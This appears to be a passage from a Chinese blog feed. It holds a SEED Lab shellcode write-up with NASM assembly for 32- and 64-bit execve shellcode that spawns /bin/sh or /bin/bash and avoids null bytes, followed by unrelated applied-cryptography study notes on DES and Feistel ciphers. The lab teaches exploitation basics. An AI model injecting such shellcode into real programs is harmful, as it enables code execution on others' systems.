中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax, &quot;##la&quot;</span><br><span class="line">shr eax, 16</span><br><span class="line">push eax</span><br><span class="line">xor eax, eax</span><br><span class="line">push &quot;ls -&quot;</span><br><span class="line">mov edx, esp       ; argv[2]</span><br></pre></td></tr></table></figure><p>这五行将另一个特殊的字符串 “##la” 压入栈中。然后将 eax 的值右移 16 位，将高 16 位清零。再将 eax 的值压入栈中作为参数列表的第三个参数 argv[2]。接着将字符串 “ls -“ 压入栈中。最后，将栈顶的地址存储到寄存器 edx 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push eax ; 前面eax异或过了，这里是0  argv[3]</span><br><span class="line">push edx ; ls -al</span><br><span class="line">push ecx ; -c </span><br><span class="line">push ebx ; /bin/sh</span><br><span class="line">mov ecx, esp</span><br></pre></td></tr></table></figure><p>这四行将值为 0 的 eax 压入栈中，作为参数列表的终止符号。然后依次将 edx、ecx 和 ebx 的值（即 argv[2]、argv[1] 和 argv[0]）压入栈中，作为参数列表的剩余部分。最后，将栈顶的地址存储到寄存器 ecx 中，此时 ecx 指向整个参数列表</p><p>直接编译重新运行mysh<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697694957648-263fafe7-2346-4f40-87d2-379958b58659.png#averageHue=%230c0a08&clientId=ua3204ecc-477c-4&from=paste&height=238&id=ub20740f9&originHeight=375&originWidth=911&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=107505&status=done&style=none&taskId=u26d48ab0-412c-44eb-aae9-38cdf6b9c9a&title=&width=578.4127246801918" alt="image.png"><br />在命令行中输入“ls -la”，观察到二者结果相同（排序不同无所谓）<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697695073763-b9dae29b-ab4f-46cb-ad5e-6638c852cd9f.png#averageHue=%230c0a08&clientId=ua3204ecc-477c-4&from=paste&height=199&id=uceddaa40&originHeight=314&originWidth=909&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=84787&status=done&style=none&taskId=u8e661196-312a-4da4-9f9f-50f1597a051&title=&width=577.142883352683" alt="image.png"><br><a name="R2J2W"></a></p><h3 id="2-1-4-Task-1-d-Providing-Environment-Variables-for-execve"><a href="#2-1-4-Task-1-d-Providing-Environment-Variables-for-execve" class="headerlink" title="2.1.4        Task 1.d. Providing Environment Variables for execve()"></a><strong>2.1.4        Task 1.d. Providing Environment Variables for execve()</strong></h3><p> execve()系统调用的第三个参数是一个指向环境变量数组的指针，它允许我们将环境变量传递给程序。在我们的示例程序中(第❹行)，我们向execve()传递了一个null指针，因此没有向程序传递环境变量。  <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698070416053-ecfee73d-d09d-46a1-821c-79609e1ff489.png#averageHue=%23e3e3e2&clientId=u91d9768c-db1f-4&from=paste&height=57&id=u72333b29&originHeight=90&originWidth=878&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=10263&status=done&style=none&taskId=u9b7fd84e-2e16-4400-9fca-e4bacaf8041&title=&width=557.460342776299" alt="image.png"></p><p> 在这个任务中，我们将编写一个名为myenv.s的shellcode。当执行这个程序时，它会执行“&#x2F;usr&#x2F;bin&#x2F;env”命令，该命令可以打印出以下环境变量:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./myenv</span><br><span class="line">aaa=1234            env[0] = address to the &quot;aaa=1234&quot; string</span><br><span class="line">bbb=5678            env[1] = address to the &quot;bbb=5678&quot; string</span><br><span class="line">cccc=1234           env[2] = address to the &quot;cccc=1234&quot; string</span><br><span class="line">                    env[3] = 0 // 0 marks the end of the array</span><br></pre></td></tr></table></figure><p> 注意此处环境变量cccc的值必须为四个字节，不允许在其后添加多余的空间。  <br /> 首先修改命令字符串部分（**<em>注意：将环境变量入栈的操作放在传入命令行参数之前</em>**）：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xor  eax, eax </span><br><span class="line">push eax          ; Use 0 to terminate the string</span><br><span class="line">push &quot;/env&quot;</span><br><span class="line">push &quot;/bin&quot;</span><br><span class="line">push &quot;/usr&quot;</span><br><span class="line">mov  ebx, esp     ; Get the string address</span><br></pre></td></tr></table></figure><p>在这段代码中，全零的字节被用作环境变量字符串的结束标志。因此，”&#x3D;123”和”cccc”这两个字符串是环境变量字符串的最后一部分，而”###4”后面的全零字节标志着环境变量字符串的结束。将字符串 “###4”的值移动到寄存器EAX中并进行右移操作的目的是生成一个全零的字节。通过将EAX寄存器的值右移24位，可以将高字节（最高的8位）设置为零，而保持低字节不变。这样就生成了一个全零的字节，可以用作字符串的结束标志。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; For environment variable </span><br><span class="line">      xor  eax, eax      </span><br><span class="line">      push eax          ; end of the string</span><br><span class="line">      push &quot;1234&quot;</span><br><span class="line">      push &quot;aaa=&quot;</span><br><span class="line">      mov ebx, esp      ; Get the address of env[0]</span><br><span class="line"> </span><br><span class="line">      xor  eax, eax      </span><br><span class="line">      push eax          ; end of the string</span><br><span class="line">      push &quot;5678&quot;</span><br><span class="line">      push &quot;bbb=&quot;</span><br><span class="line">      mov ecx, esp      ; Get the address of env[1]</span><br><span class="line"> </span><br><span class="line">      mov eax, &quot;###4&quot;</span><br><span class="line">      shr eax, 24       ; Generate 0 </span><br><span class="line">      push eax       </span><br><span class="line">      push &quot;=123&quot;</span><br><span class="line">      push &quot;cccc&quot;</span><br><span class="line">      mov edx, esp      ; Get the address of env[2]</span><br><span class="line"> </span><br><span class="line">      xor eax, eax</span><br><span class="line">      push eax          ; env[3] = 0</span><br><span class="line">      push edx          ; env[2] = address to the &quot;cccc=1234&quot; string</span><br><span class="line">      push ecx          ; env[1] = address to the &quot;bbb=5678&quot; string</span><br><span class="line">      push ebx          ; env[0] = address to the &quot;aaa=1234&quot; string</span><br><span class="line">      mov edx, esp</span><br><span class="line"> </span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor  eax, eax </span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">      push &quot;/env&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      push &quot;/usr&quot;</span><br><span class="line">      mov  ebx, esp     ; Get the string address</span><br><span class="line"> </span><br><span class="line">      ; Construct the argument array argv[]</span><br><span class="line">      push eax          ; argv[1] = 0</span><br><span class="line">      push ebx          ; argv[0] points &quot;/usr/bin/env&quot;</span><br><span class="line">      mov  ecx, esp     ; Get the address of argv[]</span><br><span class="line"> </span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与之前同理，用命令行编译执行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> nasm <span class="operator">-f</span> elf32 mysh.s <span class="literal">-o</span> mysh.o</span><br><span class="line"><span class="variable">$</span> ld <span class="literal">-m</span> elf_i386 mysh.o <span class="literal">-o</span> mysh</span><br></pre></td></tr></table></figure><p> 运行效果：  <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698122779922-e5db0407-272e-4ccb-b551-37e636ceae43.png#averageHue=%23232322&clientId=u088b6f49-2b25-4&from=paste&height=103&id=u63ef35a1&originHeight=163&originWidth=897&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=28772&status=done&style=none&taskId=u286b1994-4480-47f2-bb8e-265fb917bde&title=&width=569.5238353876312" alt="image.png"><br /> 检查有没有0x00：  <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698124545553-6e21cea4-8ebc-4fa7-83d3-a80a1c4b83f9.png#averageHue=%23222121&clientId=u088b6f49-2b25-4&from=paste&height=629&id=u89b94ce6&originHeight=1168&originWidth=1073&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=128206&status=done&style=none&taskId=u6bb24c0a-aa07-4f86-b9a7-bbe98a48320&title=&width=577.6130981445312" alt="image.png"><br /> 机器码中不存在断点0，Task1.d完成  </p><p><a name="AZ20Y"></a></p><h2 id="2-2-Task-2-Using-Code-Segment"><a href="#2-2-Task-2-Using-Code-Segment" class="headerlink" title="2.2       Task 2: Using Code Segment"></a>2.2       Task 2: Using Code Segment</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      </span><br><span class="line">      BITS 32</span><br><span class="line">        jmp short two</span><br><span class="line">   </span><br><span class="line">   one:</span><br><span class="line">        pop ebx ; ebx储存字符串地址</span><br><span class="line">        xor eax, eax ; 将eax置为0</span><br><span class="line">        mov [ebx+7], al ;将al，也即是0替换*</span><br><span class="line">        mov [ebx+8], ebx  ;将字符串的地址赋给AAAA所在的内存处(4 bytes)</span><br><span class="line">        mov [ebx+12], eax ; 将0赋给BBBB所在内存处</span><br><span class="line">        lea ecx, [ebx+8] ; ecx=ebx+8，也即是ecx储存/bin/sh\0的地址</span><br><span class="line">        xor edx, edx ;edx为0，表示无环境变量</span><br><span class="line">        mov al,  0x0b ;系统调用号</span><br><span class="line">        int 0x80</span><br><span class="line">        </span><br><span class="line">    two:</span><br><span class="line">        call one</span><br><span class="line">        db &#x27;/bin/sh*AAAABBBB&#x27; </span><br></pre></td></tr></table></figure><p><strong>最终，mysh2.s可用c语言总结为：</strong><br />char *command[] &#x3D; {“&#x2F;bin&#x2F;sh”, NULL};<br />execve(command[0], command, NULL);<br /><strong>程序的几点解释</strong></p><ul><li>程序先跳到two</li><li>two通过call指令调用one函数，这样的话，会将返回地址，也即是’&#x2F;bin&#x2F;sh*AAAABBBB’ 压入栈中，后面就可以使用pop ebx储存字符串地址</li></ul><p><strong>为何可以触发shell</strong></p><ul><li>edx为0，表示无环境变量</li><li>ecx储存&#x2F;bin&#x2F;sh\0的地址</li><li>ebx储存db字符串地址</li></ul><p>env用于打印环境变量，env后加“-”表示参数选项，因此构造字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/env - a=11 b=22</span><br></pre></td></tr></table></figure><p>得到了修改后的环境变量（图片太长了，这里不贴图了）<br />修改mysh2.s</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">        BITS 32</span><br><span class="line">        jmp short two</span><br><span class="line">    one:</span><br><span class="line">        pop ebx</span><br><span class="line">        xor eax, eax</span><br><span class="line"></span><br><span class="line">        ;the next 4 lines converse # into 0</span><br><span class="line">        mov [ebx+12], al</span><br><span class="line">        mov [ebx+15], al</span><br><span class="line">        mov [ebx+20], al</span><br><span class="line">        mov [ebx+25], al</span><br><span class="line"></span><br><span class="line">        mov [ebx+26],ebx ;put address of &quot;/usr/bin/env\0&quot; to where AAAA is</span><br><span class="line"></span><br><span class="line">        lea eax,[ebx+13]</span><br><span class="line">        mov [ebx+30],eax ;put address of &quot;-i\0&quot; to where BBBB is </span><br><span class="line"></span><br><span class="line">        lea eax,[ebx+16]</span><br><span class="line">        mov [ebx+34],eax ;put address of &quot;a=11\0&quot; to where CCCC is</span><br><span class="line"></span><br><span class="line">        lea eax,[ebx+21]</span><br><span class="line">        mov [ebx+38],eax ;put address of &quot;b=22\0&quot; to where DDDD is</span><br><span class="line"></span><br><span class="line">        xor eax,eax</span><br><span class="line">        mov [ebx+42],eax ;0 terminate</span><br><span class="line"></span><br><span class="line">        ; now ebx point to &quot;/usr/bin/env\0&quot;     </span><br><span class="line"></span><br><span class="line">        lea ecx, [ebx+26] ;put address of &quot;/usr/bin/env -i a=11 b=22&quot; to ecx </span><br><span class="line"></span><br><span class="line">        xor edx,edx ; edx = 0 </span><br><span class="line"></span><br><span class="line">        mov al,  0x0b</span><br><span class="line">        int 0x80</span><br><span class="line">     two:</span><br><span class="line">        call one</span><br><span class="line">        db &#x27;/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEE&#x27;</span><br><span class="line">           ;012345678901234567890123456789012345678901234567890</span><br><span class="line">           ;          1         2         3         4     </span><br><span class="line"> </span><br></pre></td></tr></table></figure><ul><li>代码和详细注释见上面</li><li>‘&#x2F;usr&#x2F;bin&#x2F;env#-i#a&#x3D;11#b&#x3D;22#AAAABBBBCCCCDDDDEEEE’是我们构造的字符串，通过call + pop指令可以获取该地址<ul><li>#是占位符。为了防止0导致strcpy无法复制字符串，这里使用#作为占位符，后面会用al进行替换</li></ul></li><li>&#x2F;usr&#x2F;bin&#x2F;env -i a&#x3D;11 b&#x3D;22是我们要执行的命令（一定要注意到字符串最后有个\0）<ul><li>ecx存储argv的地址，因此指向ebx+26</li><li>ebx存储“&#x2F;usr&#x2F;bin&#x2F;env\0”的地址</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysh2: mysh2.s</span><br><span class="line">nasm -f elf32 $@.s -o $@.o</span><br><span class="line">ld --omagic -m elf_i386 $@.o -o $@</span><br></pre></td></tr></table></figure><p>编译执行，运行了新的shell（omagic 选项使得代码段是可写的）<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697702605093-4a4d1d0c-cde4-4d9c-bd81-b1931cab23f8.png#averageHue=%23080604&clientId=uf4352526-8889-4&from=paste&height=137&id=uab3a41b4&originHeight=215&originWidth=1047&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=68343&status=done&style=none&taskId=u467bd0e4-33ab-4df4-9685-01c6bef4741&title=&width=664.7619349507802" alt="image.png"><br><a name="KGsAO"></a></p><h2 id="2-3-Task-3-Writing-64-bit-Shellcod"><a href="#2-3-Task-3-Writing-64-bit-Shellcod" class="headerlink" title="2.3       Task 3: Writing 64-bit Shellcod"></a>2.3       Task 3: Writing 64-bit Shellcod</h2><p>我们的任务是在64位的情况下执行&#x2F;bin&#x2F;bash<br />注意到64位和32位的不同：</p><ul><li><p>对于 x64架构，调用系统调用是通过 syscall 指令完成的</p></li><li><p>系统调用的前三个参数分别存储在 rdx、 rsi 和 rdi 寄存器中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; The following code calls execve(&quot;/bin/sh&quot;, ...)</span><br><span class="line">      xor  rdx, rdx       ; 3rd argument</span><br><span class="line">      push rdx</span><br><span class="line">        mov rax,&quot;h#######&quot;</span><br><span class="line">        shl rax,56</span><br><span class="line">        shr rax,56</span><br><span class="line">        push rax</span><br><span class="line">      mov rax,&#x27;/bin/bas&#x27;</span><br><span class="line">      push rax</span><br><span class="line">      mov rdi, rsp        ; 1st argument</span><br><span class="line">      push rdx ; 重点是这两行</span><br><span class="line">      push rdi </span><br><span class="line">      mov rsi, rsp        ; 2nd argument</span><br><span class="line">      xor  rax, rax</span><br><span class="line">      mov al, 0x3b        ; execve()</span><br><span class="line">      syscall</span><br></pre></td></tr></table></figure><p>几点需要注意的：</p></li><li><p>rax是系统调用号，这里执行execve</p></li><li><p>rdi储存&#x2F;bin&#x2F;bash\0的地址</p></li><li><p>rdx是0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f elf64 mysh_64.s -o mysh_64.o</span><br><span class="line">$ ld mysh_64.o -o mysh_64</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697702896267-1b462305-0c73-4e06-bcc2-cbabb84ca14a.png#averageHue=%230b0906&clientId=uf4352526-8889-4&from=paste&height=118&id=DEP7x&originHeight=186&originWidth=1005&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=57442&status=done&style=none&taskId=uf390b2fc-bdb5-420a-ad91-a7ba0f28b89&title=&width=638.0952670730985" alt="image.png"><br />objdump一下，发现确实没有0字节<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1697702981658-df9737a4-b8e9-4014-8b36-fbc81fdd53ca.png#averageHue=%23090705&clientId=uf4352526-8889-4&from=paste&height=399&id=u3ccf69b5&originHeight=628&originWidth=928&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=107244&status=done&style=none&taskId=ua0a47c5f-e602-4b63-8a80-9b2ea4b4fa7&title=&width=589.2063759640153" alt="image.png"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应用密码学</title>
      <link href="/post/645befba.html"/>
      <url>/post/645befba.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-总体大纲"><a href="#0-总体大纲" class="headerlink" title="0.总体大纲"></a>0.总体大纲</h1><p><img src="https://www.helloimg.com/images/2023/08/20/oSp49P.png" alt="image.png"></p><h1 id="1-密码学概念"><a href="#1-密码学概念" class="headerlink" title="1. 密码学概念"></a>1. 密码学概念</h1><p><strong>(1) 密码学的学科特点</strong></p><ol><li>数学基础：密码学是一门基于数学理论和算法的学科，需要熟练掌握数学知识。</li><li>多学科交叉：密码学不仅仅是数学学科，还涉及计算机科学、信息安全、电子工程等多个领域，需要跨学科合作。</li><li>应用广泛：密码学在现代社会中有着广泛的应用，如网络安全、电子商务、金融交易、政府通信等。</li><li>不断发展：随着计算机技术的不断进步，密码学也在不断发展，需要及时跟进最新的研究成果和技术进展。</li><li>安全性：密码学的主要目标是确保信息的机密性、完整性和可用性，因此安全性是其最重要的特点之一。</li></ol><p><strong>(2)研究的主要内容</strong><br>密码编码学和密码分析学<br>机密性、完整性、鉴别、抗抵赖</p><p><strong>(3)密码系统的安全条件:理论不可破详和实际不可破译，实际可用密码系统须具备的特性。</strong><br>略</p><p><strong>(4)掌握对密码系统的4种攻击方式的特点</strong><br>唯密文攻击（被动）这种攻击方式通常是密码分析中最困难的一种，因为攻击者只能通过分析密文的统计特性和密文的结构来猜测明文和密钥。需要攻击者拥有大量的密文和足够的时间和计算资源来破解密码系统<br>已知明文攻击（被动）攻击者已经知道了一部分的明文和密文，可以通过比对明文和密文之间的关系来推断出密钥。需要攻击者在攻击之前收集到一些明文和密文的对应关系。<br>选择明文攻击（主动）攻击者可以选择一些明文，获得对应的密文，以此来推断出密钥。可以选择任意的明文，可以更加精准地推断出密钥。需要攻击者能够向密码系统发送恶意的明文。<br>选择密文攻击（主动）攻击者可以选择一些密文，获得对应的明文或其他密文，以此来推断出密钥。需要攻击者能够向密码系统发送恶意的密文。</p><p><strong>(5) 正确理解密码系统安全性原则:“切秘密寓于密钥之中”</strong><br>（柯克霍夫斯(Kerckhoffs)原则）密码体制的安全性仅应依赖于对密钥的保密,而不应依赖于对算法的保密。只有在假设攻击者对密码算法有充分的研究,并且拥有足够的计算资源的情况下仍然安全的密码才是安全的密码系统。不把密码系统的安全性建立在算法保密性上,意味着密码算法可以公开,也可以被分析,即使攻击者知道密码算法也没有关系。</p><p><strong>(6) 两类重要密码体制，即对称密码体制和非对称密码体制的主要特点</strong><br><strong>对称密码体制</strong>（常规密码体制、秘密密钥密码体制）对明文&#x2F;密文变换时，加解密密钥相同，或可相互导出;<br>双方在通信前需要安全地协商共享密钥;<br>加解密算法效率较公开密码算法高;<br>系统开放性差，密钥管理复杂;<br>不能提供抗抵赖服务。</p><p><strong>非对称密码体制</strong> (公钥密码体制、公开密钥密码体制)对明文&#x2F;密文变换时，加解密密钥不相同，且不能由加密密钥(公钥，公开) 导出解密密钥 (私钥，保密);<br>系统开放性好，密钥管理较容易可提供抗抵赖服务（数字签名）<br>加解密运算复杂，效率低，不宜作数据加密.<br>存在特有的“可能报文攻击”的威胁。</p><p><strong>(7) 两种保密通信模型及原理</strong></p><ol><li><strong>点对点保密通信模型</strong></li></ol><p>是指通信双方之间进行加密通信，以保护通信内容的机密性和完整性。在点对点保密通信模型中，通信双方需要使用相同的密钥来进行加密和解密。<br>点对点保密通信模型的原理是基于对称加密算法，通信双方需要事先协商好一个密钥，并使用该密钥来进行加密和解密。在通信过程中，明文消息被加密成密文，只有使用正确的密钥才能将密文解密成明文。<br>点对点保密通信模型的优点是加解密速度快，但需要保证密钥的安全性。</p><ol start="2"><li><strong>多方保密通信模型</strong></li></ol><p>是指多个参与者之间进行加密通信，以保护通信内容的机密性和完整性。在多方保密通信模型中，每个参与者需要使用不同的密钥来进行加密和解密。<br>多方保密通信模型的原理是基于公钥加密算法和数字签名算法。在多方保密通信过程中，每个参与者都有自己的公钥和私钥，公钥用于加密和验证数字签名，私钥用于解密和签名。在通信过程中，每个参与者可以使用其他参与者的公钥来加密消息，只有使用正确的私钥才能解密消息。同时，参与者还可以使用自己的私钥对消息进行签名，以保证消息的真实性和完整性。<br>多方保密通信模型的优点是可以保证通信内容的机密性、完整性和真实性，但加解密速度较慢，并且需要管理多个密钥。</p><h1 id="2-古典密码技术"><a href="#2-古典密码技术" class="headerlink" title="2.古典密码技术"></a>2.古典密码技术</h1><p><strong>(1)替代密码与置换密码的概念与表示方法</strong></p><p><strong>替代（替换）密码</strong><br>•替代密码是指先建立一个替换表，加密时将需要加密的明文依次通过查表，替换为相应的字符，明文字符被逐个替换后，生成无任何意义的字符串，即密文，替代密码的密钥就是其替换表 ；<br>•根据密码算法加解密时使用替换表多少的不同，替代密码又可分为单表替代密码和多表替代密码。<br>单表替代密码: 密码算法加解密时使用一个固定的替换表；<br>多表替代密码: 密码算法加解密时使用多个替换表。</p><p><strong>置换密码</strong><br>•置换密码又称为换位密码；<br>•置换密码通过改变明文消息各元素的相对位置，但明文消息元素本身的取值或内容形式不变；<br>•在前面的替代密码中，则可以认为是保持明文的符号顺序，但是将它们用其它符号来替代。<br>置换密码在实质上是Hill密码的特例。所以置换密码属线性变换的密码。</p><p><strong>(2)单表替换密码、多表替换密码的概念</strong><br>单表替换密码：一般单表替代密码、移位密码、仿射密码、密钥短语密码<br>一般单表替代密码的原理是以26个英文字母集合上的一个置换π为密钥，对明文消息中的每个字母依次进行变换。<br><strong>·</strong>密钥空间K很大，|K|&#x3D;26!&#x3D;4×1026 ，破译者穷举搜索计算不可行，1微秒试一个密钥，遍历全部密钥需要1013年。<br><strong>·</strong>移位密码体制是替换密码体制的一个特例，它仅含26个置换做为密钥空间。<br><strong>·</strong>密钥_π_不便记忆。</p><p>多表替代密码的特点是使用了两个或两个以上的替代表。<br>多表替换密码：维吉尼亚密码、Hill密码、一次一密密码、Playfair密码</p><p><strong>(3)掌握 Hill 密码的特性与计算方法</strong><br>Hill密码算法的基本思想是通过线性变换将_n_个明文字母转换为_n_个密文字母。解密只需做一次逆变换即可。<br><img src="https://www.helloimg.com/images/2023/08/20/oSp99c.png" alt="image.png"></p><h1 id="3-机密性"><a href="#3-机密性" class="headerlink" title="3.机密性"></a>3.机密性</h1><h2 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h2><h3 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h3><h4 id="总体共性"><a href="#总体共性" class="headerlink" title="总体共性"></a>总体共性</h4><p>分组密码体制（Block cipher）是在密钥_k_控制下一次变换一个明文数据块的密码体制<br>具有速度快、易于标准化和便于软硬件实现等特点<br>在计算机通信和信息系统安全领域有着最广泛的应用</p><p>针对安全性的两个基本原则：<br>·混淆原则(Confusion) ：又称混乱原则、扰乱原则等，是指将密文、明文、密钥三者之间的统计关系和代数关系变得尽可能复杂<strong>（主要利用复杂的非线性替换算法）</strong><br>·扩散原则(Diffusion) ：将明文的统计规律和结构规律散射到相当长的一段统计中去<strong>（最简单的方法是迭代换位（置换））</strong><br><strong>乘积</strong>和<strong>迭代</strong>机制有助于实现混淆和扩散</p><p>分组加密算法的两个基本结构：<strong>SPN</strong>与<strong>Feistel</strong>：<br>SPN结构也是一种特殊的迭代密码 ，SPN结构和Feistel结构相比，可以得到更快速的扩散，但是SPN密码的加解密运算通常不完全相同。** **<br>Feistel 密码密文的任何一位均与明文和密钥的每一位相关；而明文和密钥的任何一位的变化将影响到尽量多的密文，其中函数 f 用于产生扩散和混淆作用，但并不要求为可逆函数；</p><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p>数据分组长度、密文分组长度为<strong>64位</strong>，<br>使用的密钥为<strong>64位</strong>，但有效密钥长度为<strong>56位</strong>(有8位用于奇偶校验)。<br><strong>16轮</strong>迭代的Feistel密码算法。<br>       DES由初始置换，16轮迭代，初始逆置换组成<br>DES基本运算操作：置换、替换、异或与循环移位<br>解密算法和加密相同，但子密钥的使用顺序相反。<br>体制是公开的，系统的安全性完全靠密钥的保密<br><strong>S盒设计特点：</strong>(1) 任何S盒都不是输入变量的线性函数；<br>(2) S盒的每一行(除输入比特的最左和最右比特确定) 包括所有16种比特组合；<br>(3) 改变S盒的1个输入位，至少引起2位的输出变化；<br>(4）当固定S盒的1位输入时，S盒的每一位输出中0和1的个数尽可能平衡<br><strong>Festial结构特性</strong>主要优点：<br>1.设计容易: f 函数不要求可逆,  加、解密算法结构相同；<br>2.强度高：如果 f  函数是随机的，则连续若干轮复合形成的函数与随机置换是无法区分的.<br>主要缺点：</p><ol><li>每轮加密时输入有一半没有改变;</li><li>左右块的加密处理不能并行实施</li></ol><p>Feistel模型至少需要3轮才可实现完全性,  且当其F函数具有完全性时，只需3轮即可实现完全性，此时DES算法需且只需5轮即可实现完全性<br><img src="https://www.helloimg.com/images/2023/08/20/oSpOkq.png" alt="image.png"><br><strong>重点：DES算法的互补对称性</strong><img src="https://www.helloimg.com/images/2023/08/20/oSpdar.png" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/08/20/oSpvbT.png" alt="image.png"><br><img 